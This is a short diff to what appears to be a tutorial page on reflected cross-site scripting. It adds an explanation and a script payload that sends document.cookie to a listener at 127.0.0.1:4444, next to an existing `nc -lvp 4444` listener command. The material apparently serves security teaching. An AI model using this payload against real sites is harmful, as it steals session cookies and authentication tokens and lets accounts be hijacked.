@@ -68,4 +68,12 @@ Command:
 `nc -lvp 4444`  
 Listens on port 4444 for incoming connections in verbose mode.
 
+Using this payload, we can send the webpage's cookies to a server on 127.0.0.1:4444 by creating an image request with the document.cookie as a query string. The server will capture and log the cookies, which may include sensitive information like authentication tokens or session data.
+
+```js
+<script>
+  new Image().src="http://127.0.0.1:4444?output="+document.cookie;
+</script>
+```
+
 ![snapshot]({{ site.baseurl }}/assets/img/security/xss-reflected-cookie.png)
